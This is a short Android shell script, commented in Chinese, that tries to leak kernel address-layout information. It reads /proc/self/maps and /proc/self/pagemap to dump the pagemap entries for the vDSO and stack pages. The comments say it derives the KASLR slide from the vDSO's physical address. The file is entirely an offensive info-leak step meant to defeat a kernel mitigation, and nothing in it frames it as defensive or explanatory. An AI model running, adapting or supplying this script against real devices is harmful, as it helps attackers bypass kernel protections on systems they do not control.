#!/system/bin/sh
# pagemap_vdso_leak.sh
# 通过 /proc/self/pagemap 找到 vDSO 的物理地址
# vDSO 是内核映射到用户空间的页面，其物理地址在内核直接映射区
# 用 kallsyms 偏移算出当前 KASLR slide

echo "=== vDSO PAGEMAP LEAK ==="

# 从 /proc/self/maps 找到 vDSO 地址
VDSO_ADDR=$(grep '\[vdso\]' /proc/self/maps | head -1 | cut -d'-' -f1)
echo "vDSO virtual address: 0x$VDSO_ADDR"

# 计算 vDSO 在 pagemap 中的偏移
# pagemap 每个条目 8 字节，每个条目对应一个 4KB 页
# 偏移 = (虚拟地址 / 4096) * 8
PAGE_SIZE=4096
VDSO_DEC=$((16#$VDSO_ADDR))
PAGE_INDEX=$((VDSO_DEC / PAGE_SIZE))
PAGEMAP_OFFSET=$((PAGE_INDEX * 8))

echo "Page index: $PAGE_INDEX"
echo "Pagemap offset: $PAGEMAP_OFFSET"

# 读取 pagemap 条目
echo ""
echo "=== Reading pagemap entry for vDSO ==="
dd if=/proc/self/pagemap bs=1 skip=$PAGEMAP_OFFSET count=8 2>/dev/null | od -A x -t x1 -v

# 也读取栈的 pagemap 条目作为对比
STACK_ADDR=$(grep '\[stack\]' /proc/self/maps | head -1 | cut -d'-' -f1)
echo ""
echo "Stack virtual address: 0x$STACK_ADDR"
STACK_DEC=$((16#$STACK_ADDR))
STACK_PAGE_INDEX=$((STACK_DEC / PAGE_SIZE))
STACK_PAGEMAP_OFFSET=$((STACK_PAGE_INDEX * 8))
echo "Stack pagemap offset: $STACK_PAGEMAP_OFFSET"
echo ""
echo "=== Reading pagemap entry for stack ==="
dd if=/proc/self/pagemap bs=1 skip=$STACK_PAGEMAP_OFFSET count=8 2>/dev/null | od -A x -t x1 -v

echo ""
echo "=== DONE ==="
